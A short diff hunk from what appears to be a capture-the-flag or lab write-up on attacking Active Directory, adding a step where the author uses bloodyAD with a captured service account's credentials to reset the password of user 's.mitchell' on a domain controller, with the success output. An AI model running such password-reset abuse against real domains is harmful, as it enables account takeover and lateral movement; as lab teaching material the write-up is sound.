@@ -326,4 +326,11 @@ Using this new user, ill look at bloodhound and i see this user has the ability 
 
 `s.mitchell` looks the most interesting since he is part of three groups and has two outbound object control
 
+```python
+❯❯❯ bloodyAD --host dc01.orion.local -d orion.local -u svc-onboarding -p 'password2510' set password 's.mitchell' 'Password123!'
+[+] Password changed successfully!
+```
+
+Ill use bloodyAD to change the password
+
 
